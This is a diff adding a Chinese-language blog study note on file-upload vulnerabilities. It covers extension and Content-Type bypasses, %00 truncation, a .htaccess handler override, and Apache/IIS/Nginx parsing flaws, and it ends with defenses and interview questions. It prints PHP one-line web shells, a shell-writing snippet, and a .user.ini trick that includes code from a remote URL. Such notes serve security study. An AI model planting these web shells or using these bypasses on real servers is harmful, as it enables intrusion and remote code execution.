@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>文件上传总结</title>
+      <link href="/2023/06/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/"/>
+      <url>/2023/06/30/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/</url>
+      
+        <content type="html"><![CDATA[<h1 id="文件上传："><a href="#文件上传：" class="headerlink" title="文件上传："></a>文件上传：</h1><p>常见安全问题：</p><ul><li>1、上传脚本文件，服务器web容器解释并执行了脚本，导致代码执行</li><li>2、上传病毒、木马文件、引诱用户或管理员下载执行</li><li>3、上传钓鱼图片、或者包含了脚本的文件，在某些版本的浏览器中作为脚本执行，或者钓鱼欺诈</li></ul><h2 id="客户端检测-绕过："><a href="#客户端检测-绕过：" class="headerlink" title="客户端检测+绕过："></a>客户端检测+绕过：</h2><p>前端验证文件后缀：shell.php.png<br>        但是可以直接修改前端验证代码（png改成php），或者抓包修改文件后缀-&gt;shell.php.png-&gt;shell.pnp</p><h2 id="后端验证："><a href="#后端验证：" class="headerlink" title="后端验证："></a>后端验证：</h2><p>1、白名单校对——%00截断：<br>在C或者PHP语言中0x00被认为是终止符。后缀名可以修改为xxx.php%00.jpg，绕过文件类型验证判断<br>    但在服务器中是xxx.php 因为jpg没有被执行解释。[\0]16进制<br>    原理：URL中%00转换为ASCII字符是0，而ASCII中的0作为特殊字符保留，表示字符串结束。</p><p>2、Content-Type：判断类型，也可以抓包直接修改为image&#x2F;png</p><p>3、MIME Sniff功能：读取文件前256个字节判断文件类型</p><p>4、黑名单： </p><ul><li><p>4.1 可以文件后缀替换<br>asp 可以用 asa 、 cer</p></li><li><p>4.2 过滤了大部分后缀，无法上传可以找有没有过滤htaccess文件（apache 的配置文件，在网站的根目录下）</p></li></ul><p>http.conf文件(前提条件)<br>在此文件中设置 AllowOverried All ，才能使用.htaccess文件</p><p>如果在一个黑名单中添加了很多后缀名，唯独没有对htaccess过滤，可以直接上传.htaccess来设置使用php解析任意文件。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;\.jpg&quot;&gt;</span><br><span class="line">  SetHandler application/x-httpd-php</span><br><span class="line">&lt;/FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>任意文件都可以被PHP执行</p><p>可以直接上传一句话木马<br>保存为 stack.jpg 文件</p><p><code>&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code></p><ul><li>4.3 空格绕过黑名单</li></ul><p>抓包后修改后缀，加一个空格 test.ph p </p><ul><li>4.4 大小写绕过</li></ul><h3 id="Apache文件解析问题（存在于Apache1-x-Apache2-x中）"><a href="#Apache文件解析问题（存在于Apache1-x-Apache2-x中）" class="headerlink" title="Apache文件解析问题（存在于Apache1.x Apache2.x中）"></a>Apache文件解析问题（存在于Apache1.x Apache2.x中）</h3><p>apache 是从后面向前解析文件名的。可以通过mime.types查看Apache认识什么类型的文件。<br>    xxx.php.jar.jar 从后往前解析，如果jar 不能解析，再往左，直到解析到php 后缀，此文件就作为PHP文件执行了</p><h3 id="IIS文件解析漏洞："><a href="#IIS文件解析漏洞：" class="headerlink" title="IIS文件解析漏洞："></a>IIS文件解析漏洞：</h3><p>IIS5.x&#x2F;6.0在处理含有特殊符号的文件路径时会出现逻辑漏洞，从而造成文件解析漏洞<br>        &#x2F;test.asp&#x2F;shell.jpg    会新建一个文件夹，该文件夹中所有文件都被当做asp执行<br>        shell.asp;.jpg类似%00截断，解析后为shell.asp 执行</p><h3 id="Nginx-文件解析"><a href="#Nginx-文件解析" class="headerlink" title="Nginx 文件解析"></a>Nginx 文件解析</h3><p>  上传图片马后，在访问图片路径后加&#x2F;x.php,找不到x.php文件时，会向上继续寻找，我们构造的图片马，导致代码执行。<br>条件是配置文件中 CGI默认开启 影响版本IIS7.0&#x2F;7.5</p><p>如果CGI关闭，还存在截断解析，上传图片马访问时&#x2F;shell.jpg%00.php 解析为PHP文件</p><p>另一种利用可以在图片中写入生成shell文件的代码<br><?php fputs(fopen('shell.php'.'w'),'<?php eval($_POST[cmd])?>‘);?&gt;<br>访问test.jpg&#x2F;.php会在该目录生成一句话木马</p><p>文件上传</p><h1 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h1><pre><code>1、文件上传后的目录设置为不可执行的文件，可以放在独立的存储器上，作为静态文件处理2、使用随机数改写文件名和文件路径，不对外展示存储路径和文件名3、图片二次渲染，使用压缩函数处理图片4、黑白名单</code></pre><h3 id="实战利用："><a href="#实战利用：" class="headerlink" title="实战利用："></a>实战利用：</h3><p>1、查看前端是否有验证<br>有验证直接修改<br>没有验证直接抓包</p><p>2、抓到包修改Content-Disposition filename &#x3D; ‘xxx.php’<br>Content-Type: image&#x2F;png</p><p>内容：xxxxxxxxxxxxxx(可插入后门代码)</p><p>如果直接上传成功，则直接利用</p><p>3、有内容字符过滤</p><ul><li><p>转换后门代码格式</p></li><li><p>图片中内容字符中可以插入后门代码</p></li><li><p>图片有二次渲染则保存二次渲染的图片</p><ul><li>在二次渲染的图片中插入后门代码</li></ul></li><li><p>突破 . 过滤</p><ul><li>利用远程ip转换地址调用执行<br> .user.ini  文件 auto_prepend_file&#x3D;xxx.png<br>  xxx.png<?=include'http://6464646'?><br>远程地址文件中添加后门，可以远程调用</li></ul></li></ul><p>调用：<br>post：x&#x3D;执行文件</p><p>面试：</p><h3 id="文件上传利用Windows特性绕过？"><a href="#文件上传利用Windows特性绕过？" class="headerlink" title="文件上传利用Windows特性绕过？"></a>文件上传利用Windows特性绕过？</h3><h1 id="1、Windows大小写不敏感，可以利用后缀大小写绕过"><a href="#1、Windows大小写不敏感，可以利用后缀大小写绕过" class="headerlink" title="1、Windows大小写不敏感，可以利用后缀大小写绕过"></a>1、Windows大小写不敏感，可以利用后缀大小写绕过</h1><h1 id="2、修改后缀绕过，Windows特性文件命名不允许-或-空格-会自动去掉，利用这个特性绕过"><a href="#2、修改后缀绕过，Windows特性文件命名不允许-或-空格-会自动去掉，利用这个特性绕过" class="headerlink" title="2、修改后缀绕过，Windows特性文件命名不允许 .或 空格 会自动去掉，利用这个特性绕过"></a>2、修改后缀绕过，Windows特性文件命名不允许 .或 空格 会自动去掉，利用这个特性绕过</h1><p>黑名单过滤了大部分后缀，没有过滤加点后的后缀<code>shell.php.</code><br>抓包改后缀加一个. 或者 _（下划线为空格），上传绕过<br>抓包修改后缀名<br>Windows不允许这种命名，所以会自动去掉空格和点</p><p>大小写绕过-window特性对大小写不敏感<br>截断绕过<br>同义后缀替换绕过<br>中间件文件后缀解析绕过<br>IIS&#x2F;5&#x2F;6&#x2F;7<br>Nginx<br>Apache<br>Windows特性绕过</p><ul><li>大小写不敏感</li><li>特殊符号解析时过滤</li></ul><p>上传图片如何解析？<br>有一个shell，如何利用xss实现长久控制？</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> 文件上传 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>序列化-python反序列化</title>
       <link href="/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-python%E5%8F%8D%E5%BA%8F%E5%88%97/"/>
       <url>/2023/06/06/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%88%9D%E5%AD%A6-python%E5%8F%8D%E5%BA%8F%E5%88%97/</url>
